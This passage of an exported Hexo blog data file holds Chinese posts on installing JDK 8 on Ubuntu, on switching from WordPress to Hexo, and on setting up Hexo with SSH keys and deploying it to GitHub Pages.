运维\n---\n\n首先到java官网下载jdk:[http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html](http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html)\n\n我使用的是ubuntu64位系统，所以下载的是jdk-8u144-linux-x64.tar.gz这个文件，下载完解压到/usr/lib/jvm目录下\n```\n\tsudo tar zxvf jdk-8u144-linux-x64.tar.gz -C /usr/lib/jvm\n```\n(如果没有/usr/lib/jvm目录先使用\n```\n\tcd /usr/lib\n\tsudo mkdir jvm\n```\n这两条命令创建)\n<!--more-->\n然后打开终端，输入\n```\n\tgedit ~/.bashrc\n```\n在文本末尾加上\n```\n\texport JAVA_HOME=/usr/lib/jvm/jdk1.8.0_144\n\texport JRE_HOME=${JAVA_HOME}/jre\n\texport CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib\n\texport PATH=${JAVA_HOME}/bin:$PATH\n```\n然后保存关闭编辑器，输入\n```\n\tsource ~/.bashrc\n```\n使得环境变量配置生效\n\n输入\n```\n\tjava -version\n```\n如果出现版本号说明安装配置成功\n\n以上在联网的情况下可以通过\n```\n\tsudo apt-get install openjdk-8-jdk\n```\n完成","slug":"post231","published":1,"updated":"2020-11-02T07:15:27.899Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdl001xq0szbvexmupf","content":"<p>首先到java官网下载jdk:<a href=\"http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html\" target=\"_blank\" rel=\"noopener\">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a></p>\n<p>我使用的是ubuntu64位系统，所以下载的是jdk-8u144-linux-x64.tar.gz这个文件，下载完解压到/usr/lib/jvm目录下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo tar zxvf jdk-8u144-linux-x64.tar.gz -C /usr/lib/jvm</span><br></pre></td></tr></table></figure></p>\n<p>(如果没有/usr/lib/jvm目录先使用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /usr/lib</span><br><span class=\"line\">sudo mkdir jvm</span><br></pre></td></tr></table></figure></p>\n<p>这两条命令创建)<br><a id=\"more\"></a><br>然后打开终端，输入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gedit ~/.bashrc</span><br></pre></td></tr></table></figure></p>\n<p>在文本末尾加上<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export JAVA_HOME=/usr/lib/jvm/jdk1.8.0_144</span><br><span class=\"line\">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre</span><br><span class=\"line\">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib</span><br><span class=\"line\">export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH</span><br></pre></td></tr></table></figure></p>\n<p>然后保存关闭编辑器，输入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">source ~/.bashrc</span><br></pre></td></tr></table></figure></p>\n<p>使得环境变量配置生效</p>\n<p>输入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -version</span><br></pre></td></tr></table></figure></p>\n<p>如果出现版本号说明安装配置成功</p>\n<p>以上在联网的情况下可以通过<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install openjdk-8-jdk</span><br></pre></td></tr></table></figure></p>\n<p>完成</p>\n","site":{"data":{}},"excerpt":"<p>首先到java官网下载jdk:<a href=\"http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html\" target=\"_blank\" rel=\"noopener\">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a></p>\n<p>我使用的是ubuntu64位系统，所以下载的是jdk-8u144-linux-x64.tar.gz这个文件，下载完解压到/usr/lib/jvm目录下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo tar zxvf jdk-8u144-linux-x64.tar.gz -C /usr/lib/jvm</span><br></pre></td></tr></table></figure></p>\n<p>(如果没有/usr/lib/jvm目录先使用<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /usr/lib</span><br><span class=\"line\">sudo mkdir jvm</span><br></pre></td></tr></table></figure></p>\n<p>这两条命令创建)<br>","more":"<br>然后打开终端，输入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gedit ~/.bashrc</span><br></pre></td></tr></table></figure></p>\n<p>在文本末尾加上<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">export JAVA_HOME=/usr/lib/jvm/jdk1.8.0_144</span><br><span class=\"line\">export JRE_HOME=$&#123;JAVA_HOME&#125;/jre</span><br><span class=\"line\">export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib</span><br><span class=\"line\">export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH</span><br></pre></td></tr></table></figure></p>\n<p>然后保存关闭编辑器，输入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">source ~/.bashrc</span><br></pre></td></tr></table></figure></p>\n<p>使得环境变量配置生效</p>\n<p>输入<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -version</span><br></pre></td></tr></table></figure></p>\n<p>如果出现版本号说明安装配置成功</p>\n<p>以上在联网的情况下可以通过<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install openjdk-8-jdk</span><br></pre></td></tr></table></figure></p>\n<p>完成</p>"},{"title":"新起点，新征程","date":"2017-12-03T01:21:20.000Z","_content":"\n## 新起点，新征程\n之前一直再用wordpress写博客，但是wordpress有很多缺点，比如说不够安全，评论方面太多广告，占用服务器资源，等等。后来发现一个[朋友的博客](http://www.se7ensec.cn/)换成了hexo，百度了一下，纯静态博客，还能托管到github，不需要自己的公网服务器资源，于是当晚就开始接触配置，托管之后发现不能配置https，对于有点强迫症的我来说难以忍受，再加上托管服务器在日本，就又配合腾讯云的cdn加速服务实现了https。详细的过程有空会写个博客记录下来。\n<!--more-->\n![new](https://blog-1252906577.costj.myqcloud.com/img/new.jpg)\n总结一下hexo的优缺点：\n\n优点：安全，节约资源，配置简单高效，静态网站对搜索引擎更友好\n\n缺点：只能在特定电脑上配置，如果没有及时备份本地数据，一旦本地文件丢失，后果不堪设想\n\n其实这些缺点对于不经常更新的个人博客来说无关紧要，所以最终舍弃了wordpress而投入了hexo的怀抱。\n\n我的博客一直很少更新，但从没打算放弃。写的博文少，看的人更少。不过每当想到会有人从看我的博客中受益，就很满足了。\n\n新起点，新征程，愿所有真诚都不会被辜负。","source":"_posts/post232.md","raw":"---\ntitle: 新起点，新征程\ndate: 2017-12-03 09:21:20\ntags: 随笔\n---\n\n## 新起点，新征程\n之前一直再用wordpress写博客，但是wordpress有很多缺点，比如说不够安全，评论方面太多广告，占用服务器资源，等等。后来发现一个[朋友的博客](http://www.se7ensec.cn/)换成了hexo，百度了一下，纯静态博客，还能托管到github，不需要自己的公网服务器资源，于是当晚就开始接触配置，托管之后发现不能配置https，对于有点强迫症的我来说难以忍受，再加上托管服务器在日本，就又配合腾讯云的cdn加速服务实现了https。详细的过程有空会写个博客记录下来。\n<!--more-->\n![new](https://blog-1252906577.costj.myqcloud.com/img/new.jpg)\n总结一下hexo的优缺点：\n\n优点：安全，节约资源，配置简单高效，静态网站对搜索引擎更友好\n\n缺点：只能在特定电脑上配置，如果没有及时备份本地数据，一旦本地文件丢失，后果不堪设想\n\n其实这些缺点对于不经常更新的个人博客来说无关紧要，所以最终舍弃了wordpress而投入了hexo的怀抱。\n\n我的博客一直很少更新，但从没打算放弃。写的博文少，看的人更少。不过每当想到会有人从看我的博客中受益，就很满足了。\n\n新起点，新征程，愿所有真诚都不会被辜负。","slug":"post232","published":1,"updated":"2020-10-28T10:22:47.328Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdm001zq0szgd8thve1","content":"<h2 id=\"新起点，新征程\"><a href=\"#新起点，新征程\" class=\"headerlink\" title=\"新起点，新征程\"></a>新起点，新征程</h2><p>之前一直再用wordpress写博客，但是wordpress有很多缺点，比如说不够安全，评论方面太多广告，占用服务器资源，等等。后来发现一个<a href=\"http://www.se7ensec.cn/\" target=\"_blank\" rel=\"noopener\">朋友的博客</a>换成了hexo，百度了一下，纯静态博客，还能托管到github，不需要自己的公网服务器资源，于是当晚就开始接触配置，托管之后发现不能配置https，对于有点强迫症的我来说难以忍受，再加上托管服务器在日本，就又配合腾讯云的cdn加速服务实现了https。详细的过程有空会写个博客记录下来。<br><a id=\"more\"></a><br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/new.jpg\" alt=\"new\"><br>总结一下hexo的优缺点：</p>\n<p>优点：安全，节约资源，配置简单高效，静态网站对搜索引擎更友好</p>\n<p>缺点：只能在特定电脑上配置，如果没有及时备份本地数据，一旦本地文件丢失，后果不堪设想</p>\n<p>其实这些缺点对于不经常更新的个人博客来说无关紧要，所以最终舍弃了wordpress而投入了hexo的怀抱。</p>\n<p>我的博客一直很少更新，但从没打算放弃。写的博文少，看的人更少。不过每当想到会有人从看我的博客中受益，就很满足了。</p>\n<p>新起点，新征程，愿所有真诚都不会被辜负。</p>\n","site":{"data":{}},"excerpt":"<h2 id=\"新起点，新征程\"><a href=\"#新起点，新征程\" class=\"headerlink\" title=\"新起点，新征程\"></a>新起点，新征程</h2><p>之前一直再用wordpress写博客，但是wordpress有很多缺点，比如说不够安全，评论方面太多广告，占用服务器资源，等等。后来发现一个<a href=\"http://www.se7ensec.cn/\" target=\"_blank\" rel=\"noopener\">朋友的博客</a>换成了hexo，百度了一下，纯静态博客，还能托管到github，不需要自己的公网服务器资源，于是当晚就开始接触配置，托管之后发现不能配置https，对于有点强迫症的我来说难以忍受，再加上托管服务器在日本，就又配合腾讯云的cdn加速服务实现了https。详细的过程有空会写个博客记录下来。<br>","more":"<br><img src=\"https://blog-1252906577.costj.myqcloud.com/img/new.jpg\" alt=\"new\"><br>总结一下hexo的优缺点：</p>\n<p>优点：安全，节约资源，配置简单高效，静态网站对搜索引擎更友好</p>\n<p>缺点：只能在特定电脑上配置，如果没有及时备份本地数据，一旦本地文件丢失，后果不堪设想</p>\n<p>其实这些缺点对于不经常更新的个人博客来说无关紧要，所以最终舍弃了wordpress而投入了hexo的怀抱。</p>\n<p>我的博客一直很少更新，但从没打算放弃。写的博文少，看的人更少。不过每当想到会有人从看我的博客中受益，就很满足了。</p>\n<p>新起点，新征程，愿所有真诚都不会被辜负。</p>"},{"title":"Hexo安装配置并托管至github","date":"2017-12-07T10:27:36.000Z","toc":true,"_content":"所有可能用到的工具或者文件都放在百度网盘：链接：[https://pan.baidu.com/s/1mhLRnk8](https://pan.baidu.com/s/1mhLRnk8) 提取密码：7ott\n### 一、安装Hexo到本地\n\n#### 1.安装Git\n\n1.1从[官网](https://git-scm.com/download/win)或者上边提供的百度网盘下载Git安装包，由于众所周知的原因，官网下载十分缓慢。下载完安装即可，中间会让你选择默认编辑器，如果不习惯Vim推荐Notepad++作为默认编辑器，如图\n<!--more-->\n![1](/imgs/233/233-1.jpg)\n\n其他保持默认即可。\n\n#### 2.安装Node.js\n\n2.1从[官网](https://nodejs.org/zh-cn/)或者上边提供的百度网盘下载Node.js安装包。下载完安装即可，如果没有特别需求安装选项全部保持默认。\n\n#### 3.安装Hexo\n\n3.1使用Win+R打开运行，输入`cmd`，打开命令提示符，然后输入\n```sh\nnpm install -g hexo-cli\n```\n大概几十秒到2分钟后即可安装完成\n\n3.2安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。下边以放在D盘的hexo文件夹下为例\n```sh\nhexo init D:\\hexo\nD:\ncd hexo && npm install\n```\n大概几十秒到2分钟后即可安装完成，此时D:\\hexo文件夹的目录树如下\n```\n├── _config.yml\n├── package.json\n├── scaffolds\n├── source\n|   ├── _drafts\n|   └── _posts\n└── themes\n```\n\n#### 4.配置hexo\n\n4.1用Notepad++或者其他编辑器打开_config.yml文件\n\n多数设置保持默认即可，一般需要改动的有如下几项：\n```sh\ntitle: #网站名称\nsubtitle: #副标题\ndescription: #网站描述，主要用于SEO\nauthor: #作者\nlanguage: #语言，中文填写'zh-cn'，没有引号\ntimezone: #网站时区。Hexo 默认使用您电脑的时区。中国可以填写'Asia/Shanghai'，没有引号\nurl: #你的网址，可以先不改动\ntheme: #主题选择\n```\n详细配置可以参照[Hexo官方文档](https://hexo.io/zh-cn/docs/configuration.html)\n\n4.2你可以到网络上下载主题，比如[官网主题](https://hexo.io/themes/)，下载完解压到`~\\hexo\\themes`目录下的一个文件夹里，然后在`_config.yml`里边的`theme: `后填写文件夹名即可应用主题\n\n#### 5.新建博文\n\n5.1首先在cmd切换到你的hexo目录，可以在资源管理器打开hexo所在目录，然后在地址栏输入`cmd`然后敲击回车，很方便\n\n5.2cmd里边输入\n```sh\nhexo new post001\n```\n就能在`~hexo\\source\\_posts`目录下生成post001.md文件，文件名可以自定义，编辑该文件写博文，语法可以参照[Markdown新手指南](http://www.jianshu.com/p/q81RER)，或者[下载当前博文的.md文件](https://other-1252906577.costj.myqcloud.com/doc/post233.md)以作参考\n\n#### 6.生成静态文件并预览\n\n配置好hexo和主题并编辑完文章之后，可以通过\n```sh\nhexo g\n```\n生成静态文件到public文件夹，你可以复制该文件夹下所有文件到你的网站目录来发布你的博客到网络\n\n可以通过以下命令\n```sh\nhexo s\n```\n默认情况下在浏览器访问`http://localhost:4000/`预览你的博客\n\n### 二、托管hexo博客到github\n\n#### 1.注册github账号并创建Repository\n\n1.1注册账号就不多说了，登陆之后点击`new repository`，如图\n![2](/imgs/233/233-2.jpg)\n然后编辑名称为xxx.github.io，xxx为你的用户名，可以添加一些描述，如图\n![3](/imgs/233/233-3.jpg)\n完成之后点击`Create repository`\n\n#### 2.本地与github建立安全联系\n\n2.1生成ssh key\n\n2.1.1如图，打开Git Bash\n![4](/imgs/233/233-4.jpg)\n\n2.1.2创建.ssh文件夹\n```sh\nmkdir ~/.ssh\n```\n2.1.3配置全局的name和email，把下边命令里边的`xxxx`换成你github的用户名，`xxxx@xxx.com`换成你github的注册邮箱\n```sh\ngit config --global user.name \"xxxx\"  \ngit config --global user.email \"xxxx@xxx.com\"\n```\n2.1.4生成key\n```sh\nssh-keygen -t rsa -C \"xxxx@xxx.com\"\n```\n输完命令后敲击三次回车，设置的密码为空，生成key成功\n\n2.1.5打开`C:\\用户\\你的用户名`目录进入.ssh文件夹，用Notepad++或者其他编辑器打开id_rsa.pub，复制里面的内容添加到你github或者bitbucket ssh设置里即可，如下图\n![5](/imgs/233/233-5.jpg)\n![6](/imgs/233/233-6.jpg)\n标题随意填写\n\n#### 3.部署博客到github\n\n3.1为 Hexo 安装 Git 插件\n```sh\nnpm install hexo-deployer-git --save\n```\n\n3.2修改你的 _config.yml 配置文件如下\n```sh\n# Deployment\n## Docs: https://hexo.io/docs/deployment.html\ndeploy:\n  type:git\n  repo: git@github.com:xxxx/xxxx.github.io.git\n  branch: master\n```\n注意修改其中的repo为你自己github的ssh地址\n\n3.3在cmd切换到hexo目录下输入\n```sh\nhexo clean && hexo g -d\n```\n即可完成部署，然后访问xxx.github.io就能访问你的博客了\n\n3.4如果想使用自己的域名，只需要把域名CNAME解析到xxx.github.io，然后在`~\\hexo\\source`目录中创建文件`CNAME`（没有后缀名）,文件里填上你的自定义域名（没有`http://`或者`https://`）然后执行一遍\n```sh\nhexo clean && hexo g -d\n```\n即可，以后发布新文章或者有其他改动，都可以用上边的命令完成更新，或者用下边的命令在本地预览，前提是cmd切换到了hexo目录\n```sh\nhexo clean && hexo g && hexo s\n```\n\n本文参考资料：[Hexo官方文档](https://hexo.io/zh-cn/docs/)，[Hexo博客部署到github](https://www.cnblogs.com/imapla/p/5533000.html)，[win 7下git ssh创建key](http://blog.csdn.net/lsyz0021/article/details/52064829)","source":"_posts/post233.md","raw":"---\ntitle: Hexo安装配置并托管至github\ndate: 2017-12-07 18:27:36\ntags: 运维\ntoc: true\n---\n所有可能用到的工具或者文件都放在百度网盘：链接：[https://pan.baidu.com/s/1mhLRnk8](https://pan.baidu.com/s/1mhLRnk8) 提取密码：7ott\n### 一、安装Hexo到本地\n\n#### 1.安装Git\n\n1.1从[官网](https://git-scm.com/download/win)或者上边提供的百度网盘下载Git安装包，由于众所周知的原因，官网下载十分缓慢。下载完安装即可，中间会让你选择默认编辑器，如果不习惯Vim推荐Notepad++作为默认编辑器，如图\n<!--more-->\n![1](/imgs/233/233-1.jpg)\n\n其他保持默认即可。\n\n#### 2.安装Node.js\n\n2.1从[官网](https://nodejs.org/zh-cn/)或者上边提供的百度网盘下载Node.js安装包。下载完安装即可，如果没有特别需求安装选项全部保持默认。\n\n#### 3.安装Hexo\n\n3.1使用Win+R打开运行，输入`cmd`，打开命令提示符，然后输入\n```sh\nnpm install -g hexo-cli\n```\n大概几十秒到2分钟后即可安装完成\n\n3.2安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。下边以放在D盘的hexo文件夹下为例\n```sh\nhexo init D:\\hexo\nD:\ncd hexo && npm install\n```\n大概几十秒到2分钟后即可安装完成，此时D:\\hexo文件夹的目录树如下\n```\n├── _config.yml\n├── package.json\n├── scaffolds\n├── source\n|   ├── _drafts\n|   └── _posts\n└── themes\n```\n\n#### 4.配置hexo\n\n4.1用Notepad++或者其他编辑器打开_config.yml文件\n\n多数设置保持默认即可，一般需要改动的有如下几项：\n```sh\ntitle: #网站名称\nsubtitle: #副标题\ndescription: #网站描述，主要用于SEO\nauthor: #作者\nlanguage: #语言，中文填写'zh-cn'，没有引号\ntimezone: #网站时区。Hexo 默认使用您电脑的时区。中国可以填写'Asia/Shanghai'，没有引号\nurl: #你的网址，可以先不改动\ntheme: #主题选择\n```\n详细配置可以参照[Hexo官方文档](https://hexo.io/zh-cn/docs/configuration.html)\n\n4.2你可以到网络上下载主题，比如[官网主题](https://hexo.io/themes/)，下载完解压到`~\\hexo\\themes`目录下的一个文件夹里，然后在`_config.yml`里边的`theme: `后填写文件夹名即可应用主题\n\n#### 5.新建博文\n\n5.1首先在cmd切换到你的hexo目录，可以在资源管理器打开hexo所在目录，然后在地址栏输入`cmd`然后敲击回车，很方便\n\n5.2cmd里边输入\n```sh\nhexo new post001\n```\n就能在`~hexo\\source\\_posts`目录下生成post001.md文件，文件名可以自定义，编辑该文件写博文，语法可以参照[Markdown新手指南](http://www.jianshu.com/p/q81RER)，或者[下载当前博文的.md文件](https://other-1252906577.costj.myqcloud.com/doc/post233.md)以作参考\n\n#### 6.生成静态文件并预览\n\n配置好hexo和主题并编辑完文章之后，可以通过\n```sh\nhexo g\n```\n生成静态文件到public文件夹，你可以复制该文件夹下所有文件到你的网站目录来发布你的博客到网络\n\n可以通过以下命令\n```sh\nhexo s\n```\n默认情况下在浏览器访问`http://localhost:4000/`预览你的博客\n\n### 二、托管hexo博客到github\n\n#### 1.注册github账号并创建Repository\n\n1.1注册账号就不多说了，登陆之后点击`new repository`，如图\n![2](/imgs/233/233-2.jpg)\n然后编辑名称为xxx.github.io，xxx为你的用户名，可以添加一些描述，如图\n![3](/imgs/233/233-3.jpg)\n完成之后点击`Create repository`\n\n#### 2.本地与github建立安全联系\n\n2.1生成ssh key\n\n2.1.1如图，打开Git Bash\n![4](/imgs/233/233-4.jpg)\n\n2.1.2创建.ssh文件夹\n```sh\nmkdir ~/.ssh\n```\n2.1.3配置全局的name和email，把下边命令里边的`xxxx`换成你github的用户名，`xxxx@xxx.com`换成你github的注册邮箱\n```sh\ngit config --global user.name \"xxxx\"  \ngit config --global user.email \"xxxx@xxx.com\"\n```\n2.1.4生成key\n```sh\nssh-keygen -t rsa -C \"xxxx@xxx.com\"\n```\n输完命令后敲击三次回车，设置的密码为空，生成key成功\n\n2.1.5打开`C:\\用户\\你的用户名`目录进入.ssh文件夹，用Notepad++或者其他编辑器打开id_rsa.pub，复制里面的内容添加到你github或者bitbucket ssh设置里即可，如下图\n![5](/imgs/233/233-5.jpg)\n![6](/imgs/233/233-6.jpg)\n标题随意填写\n\n#### 3.部署博客到github\n\n3.1为 Hexo 安装 Git 插件\n```sh\nnpm install hexo-deployer-git --save\n```\n\n3.2修改你的 _config.yml 配置文件如下\n```sh\n# Deployment\n## Docs: https://hexo.io/docs/deployment.html\ndeploy:\n  type:git\n  repo: git@github.com:xxxx/xxxx.github.io.git\n  branch: master\n```\n注意修改其中的repo为你自己github的ssh地址\n\n3.3在cmd切换到hexo目录下输入\n```sh\nhexo clean && hexo g -d\n```\n即可完成部署，然后访问xxx.github.io就能访问你的博客了\n\n3.4如果想使用自己的域名，只需要把域名CNAME解析到xxx.github.io，然后在`~\\hexo\\source`目录中创建文件`CNAME`（没有后缀名）,文件里填上你的自定义域名（没有`http://`或者`https://`）然后执行一遍\n```sh\nhexo clean && hexo g -d\n```\n即可，以后发布新文章或者有其他改动，都可以用上边的命令完成更新，或者用下边的命令在本地预览，前提是cmd切换到了hexo目录\n```sh\nhexo clean && hexo g && hexo s\n```\n\n本文参考资料：[Hexo官方文档](https://hexo.io/zh-cn/docs/)，[Hexo博客部署到github](https://www.cnblogs.com/imapla/p/5533000.html)，[win 7下git ssh创建key](http://blog.csdn.net/lsyz0021/article/details/52064829)","slug":"post233","published":1,"updated":"2020-11-04T05:00:44.342Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdn0022q0sz4h8iy2le","content":"<p>所有可能用到的工具或者文件都放在百度网盘：链接：<a href=\"https://pan.baidu.com/s/1mhLRnk8\" target=\"_blank\" rel=\"noopener\">https://pan.baidu.com/s/1mhLRnk8</a> 提取密码：7ott</p>\n<h3 id=\"一、安装Hexo到本地\"><a href=\"#一、安装Hexo到本地\" class=\"headerlink\" title=\"一、安装Hexo到本地\"></a>一、安装Hexo到本地</h3><h4 id=\"1-安装Git\"><a href=\"#1-安装Git\" class=\"headerlink\" title=\"1.安装Git\"></a>1.安装Git</h4><p>1.1从<a href=\"https://git-scm.com/download/win\" target=\"_blank\" rel=\"noopener\">官网</a>或者上边提供的百度网盘下载Git安装包，由于众所周知的原因，官网下载十分缓慢。下载完安装即可，中间会让你选择默认编辑器，如果不习惯Vim推荐Notepad++作为默认编辑器，如图<br><a id=\"more\"></a><br><img src=\"/imgs/233/233-1.jpg\" alt=\"1\"></p>\n<p>其他保持默认即可。</p>\n<h4 id=\"2-安装Node-js\"><a href=\"#2-安装Node-js\" class=\"headerlink\" title=\"2.安装Node.js\"></a>2.安装Node.js</h4><p>2.1从<a href=\"https://nodejs.org/zh-cn/\" target=\"_blank\" rel=\"noopener\">官网</a>或者上边提供的百度网盘下载Node.js安装包。下载完安装即可，如果没有特别需求安装选项全部保持默认。</p>\n<h4 id=\"3-安装Hexo\"><a href=\"#3-安装Hexo\" class=\"headerlink\" title=\"3.安装Hexo\"></a>3.安装Hexo</h4><p>3.1使用Win+R打开运行，输入<code>cmd</code>，打开命令提示符，然后输入<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install -g hexo-cli</span><br></pre></td></tr></table></figure></p>\n<p>大概几十秒到2分钟后即可安装完成</p>\n<p>3.2安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。下边以放在D盘的hexo文件夹下为例<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo init D:\\hexo</span><br><span class=\"line\">D:</span><br><span class=\"line\"><span class=\"built_in\">cd</span> hexo &amp;&amp; npm install</span><br></pre></td></tr></table></figure></p>\n<p>大概几十秒到2分钟后即可安装完成，此时D:\\hexo文件夹的目录树如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">├── _config.yml</span><br><span class=\"line\">├── package.json</span><br><span class=\"line\">├── scaffolds</span><br><span class=\"line\">├── source</span><br><span class=\"line\">|   ├── _drafts</span><br><span class=\"line\">|   └── _posts</span><br><span class=\"line\">└── themes</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"4-配置hexo\"><a href=\"#4-配置hexo\" class=\"headerlink\" title=\"4.配置hexo\"></a>4.配置hexo</h4><p>4.1用Notepad++或者其他编辑器打开_config.yml文件</p>\n<p>多数设置保持默认即可，一般需要改动的有如下几项：<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">title: <span class=\"comment\">#网站名称</span></span><br><span class=\"line\">subtitle: <span class=\"comment\">#副标题</span></span><br><span class=\"line\">description: <span class=\"comment\">#网站描述，主要用于SEO</span></span><br><span class=\"line\">author: <span class=\"comment\">#作者</span></span><br><span class=\"line\">language: <span class=\"comment\">#语言，中文填写'zh-cn'，没有引号</span></span><br><span class=\"line\">timezone: <span class=\"comment\">#网站时区。Hexo 默认使用您电脑的时区。中国可以填写'Asia/Shanghai'，没有引号</span></span><br><span class=\"line\">url: <span class=\"comment\">#你的网址，可以先不改动</span></span><br><span class=\"line\">theme: <span class=\"comment\">#主题选择</span></span><br></pre></td></tr></table></figure></p>\n<p>详细配置可以参照<a href=\"https://hexo.io/zh-cn/docs/configuration.html\" target=\"_blank\" rel=\"noopener\">Hexo官方文档</a></p>\n<p>4.2你可以到网络上下载主题，比如<a href=\"https://hexo.io/themes/\" target=\"_blank\" rel=\"noopener\">官网主题</a>，下载完解压到<code>~\\hexo\\themes</code>目录下的一个文件夹里，然后在<code>_config.yml</code>里边的<code>theme:</code>后填写文件夹名即可应用主题</p>\n<h4 id=\"5-新建博文\"><a href=\"#5-新建博文\" class=\"headerlink\" title=\"5.新建博文\"></a>5.新建博文</h4><p>5.1首先在cmd切换到你的hexo目录，可以在资源管理器打开hexo所在目录，然后在地址栏输入<code>cmd</code>然后敲击回车，很方便</p>\n<p>5.2cmd里边输入<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo new post001</span><br></pre></td></tr></table></figure></p>\n<p>就能在<code>~hexo\\source\\_posts</code>目录下生成post001.md文件，文件名可以自定义，编辑该文件写博文，语法可以参照<a href=\"http://www.jianshu.com/p/q81RER\" target=\"_blank\" rel=\"noopener\">Markdown新手指南</a>，或者<a href=\"https://other-1252906577.costj.myqcloud.com/doc/post233.md\" target=\"_blank\" rel=\"noopener\">下载当前博文的.md文件</a>以作参考</p>\n<h4 id=\"6-生成静态文件并预览\"><a href=\"#6-生成静态文件并预览\" class=\"headerlink\" title=\"6.生成静态文件并预览\"></a>6.生成静态文件并预览</h4><p>配置好hexo和主题并编辑完文章之后，可以通过<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo g</span><br></pre></td></tr></table></figure></p>\n<p>生成静态文件到public文件夹，你可以复制该文件夹下所有文件到你的网站目录来发布你的博客到网络</p>\n<p>可以通过以下命令<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo s</span><br></pre></td></tr></table></figure></p>\n<p>默认情况下在浏览器访问<code>http://localhost:4000/</code>预览你的博客</p>\n<h3 id=\"二、托管hexo博客到github\"><a href=\"#二、托管hexo博客到github\" class=\"headerlink\" title=\"二、托管hexo博客到github\"></a>二、托管hexo博客到github</h3><h4 id=\"1-注册github账号并创建Repository\"><a href=\"#1-注册github账号并创建Repository\" class=\"headerlink\" title=\"1.注册github账号并创建Repository\"></a>1.注册github账号并创建Repository</h4><p>1.1注册账号就不多说了，登陆之后点击<code>new repository</code>，如图<br><img src=\"/imgs/233/233-2.jpg\" 